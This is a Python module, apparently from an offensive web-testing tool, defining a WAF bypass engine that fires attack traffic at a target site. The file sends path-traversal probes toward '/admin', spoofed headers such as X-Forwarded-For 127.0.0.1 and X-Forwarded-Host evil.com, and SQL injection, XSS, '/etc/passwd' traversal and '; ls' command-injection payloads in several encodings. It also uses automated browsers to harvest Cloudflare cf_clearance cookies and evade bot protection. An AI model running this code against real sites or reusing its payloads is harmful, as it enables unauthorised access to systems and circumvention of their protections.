import asyncio
import random
import urllib.parse
from urllib.parse import urlparse, parse_qs
from nexsus.utils.logger import Logger

try:
    from playwright.async_api import async_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from webdriver_manager.chrome import ChromeDriverManager
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

class WAFBypassEngine:
    def __init__(self, orchestrator):
        self.orchestrator = orchestrator
        self.paused = False
        self.logger = Logger("WAFBypass")
        self.cf_cookies = {}
        self.browser = None
        self.waf_type = orchestrator.current_waf

    async def run(self):
        target_url = self.orchestrator.get_target_url()
        if not target_url:
            self.logger.error("No target URL available in scope.")
            return

        self.logger.info(f"Starting WAF Bypass Engine on {target_url}...")
        client = self.orchestrator.http_client

        if not self.waf_type:
            self.waf_type = await self.orchestrator.detect_waf(target_url)

        if self.waf_type:
            self.logger.info(f"Target WAF: {self.waf_type}, applying specific bypass techniques...")
            await self.cloudflare_specific_tests(client, target_url)
        else:
            self.logger.info("No WAF detected, running generic bypass scan...")
            await self.generic_bypass_scan(client, target_url)

        self.logger.success("WAF Bypass completed.")

    async def cloudflare_specific_tests(self, client, base_url):
        self.logger.info("Running Cloudflare-specific bypass tests...")
        parsed = urlparse(base_url)
        host = parsed.hostname

        test_paths = [
            '/.well-known/acme-challenge/../../admin',
            '/cdn-cgi/../admin',
            '/../admin',
            '/%2e%2e/admin',
            '/%252e%252e/admin',
            '/..;/admin',
        ]
        for path in test_paths:
            test_url = f"{parsed.scheme}://{parsed.netloc}{path}"
            resp = await client.request('GET', test_url)
            if resp and resp.status != 403 and resp.status != 404:
                self.logger.success(f"Possible path bypass: {test_url} returned {resp.status}")

        headers_tests = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'CF-Connecting-IP': '127.0.0.1'},
            {'X-Original-URL': '/admin'},
            {'X-Rewrite-URL': '/admin'},
            {'X-HTTP-Method-Override': 'PUT'},
            {'X-Forwarded-Host': 'evil.com'},
            {'X-Real-IP': '127.0.0.1'},
        ]
        for headers in headers_tests:
            resp = await client.request('GET', base_url, headers=headers)
            if resp and resp.status != 403:
                self.logger.success(f"Possible header bypass with {headers} returned {resp.status}")

        if PLAYWRIGHT_AVAILABLE:
            cf_data = await self.get_cf_clearance_with_playwright(base_url)
            if cf_data:
                self.logger.success("Got cf_clearance cookie using Playwright")
                self.cf_cookies[host] = cf_data['cookie']
                if hasattr(client, 'session') and client.session:
                    client.session.cookie_jar.update_cookies({'cf_clearance': cf_data['value']})
        elif SELENIUM_AVAILABLE:
            cf_data = await self.get_cf_clearance_with_selenium(base_url)
            if cf_data:
                self.logger.success("Got cf_clearance cookie using Selenium")
                self.cf_cookies[host] = cf_data['cookie']
                if hasattr(client, 'session') and client.session:
                    client.session.cookie_jar.update_cookies({'cf_clearance': cf_data['value']})
        else:
            self.logger.info("No browser automation available (install playwright or selenium for cf_clearance)")

    async def generic_bypass_scan(self, client, url):
        self.logger.info("Running generic bypass scan...")
        encodings = ['utf-8', 'utf-16', 'unicode-escape', 'base64']
        payloads = [
            "' OR '1'='1",
            "<script>alert(1)</script>",
            "../../../etc/passwd",
            "; ls",
        ]
        for payload in payloads:
            for encoding in encodings:
                try:
                    if encoding == 'base64':
                        import base64
                        encoded = base64.b64encode(payload.encode()).decode()
                    else:
                        encoded = payload.encode(encoding, errors='ignore').decode('utf-8', errors='ignore')
                    test_url = url + "?q=" + urllib.parse.quote(encoded)
                    resp = await client.request('GET', test_url)
                    if resp and resp.status == 200:
                        self.logger.success(f"Possible bypass with {encoding} encoding: {test_url}")
                except:
                    continue

    async def get_cf_clearance_with_playwright(self, url):
        if not PLAYWRIGHT_AVAILABLE:
            return None
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=False,
                    args=['--no-sandbox', '--disable-gpu']
                )
                context = await browser.new_context(
                    user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                    viewport={'width': 1920, 'height': 1080}
                )
                page = await context.new_page()
                await page.goto(url, wait_until='networkidle', timeout=60000)
                await page.wait_for_timeout(5000)
                cookies = await context.cookies()
                await browser.close()
                for cookie in cookies:
                    if cookie['name'] == 'cf_clearance':
                        return {'value': cookie['value'], 'cookie': f"cf_clearance={cookie['value']}"}
        except Exception as e:
            self.logger.error(f"Playwright failed: {e}")
        return None

    async def get_cf_clearance_with_selenium(self, url):
        if not SELENIUM_AVAILABLE:
            return None
        try:
            options = Options()
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--disable-gpu")
            options.add_argument("--headless=new")
            options.binary_location = "/data/data/com.termux/files/usr/bin/chromium-browser"
            service = Service(ChromeDriverManager().install())
            driver = webdriver.Chrome(service=service, options=options)
            driver.get(url)
            import time
            cf_cookie = None
            for _ in range(30):
                cookies = driver.get_cookies()
                for cookie in cookies:
                    if cookie['name'] == 'cf_clearance':
                        cf_cookie = cookie
                        break
                if cf_cookie:
                    break
                time.sleep(1)
            driver.quit()
            if cf_cookie:
                return {'value': cf_cookie['value'], 'cookie': f"cf_clearance={cf_cookie['value']}"}
        except Exception as e:
            self.logger.error(f"Selenium failed: {e}")
        return None

    async def wait_if_paused(self):
        while self.paused:
            await asyncio.sleep(1)

    def pause(self):
        self.paused = True
        self.logger.debug("Paused")

    def resume(self):
        self.paused = False
        self.logger.debug("Resumed")
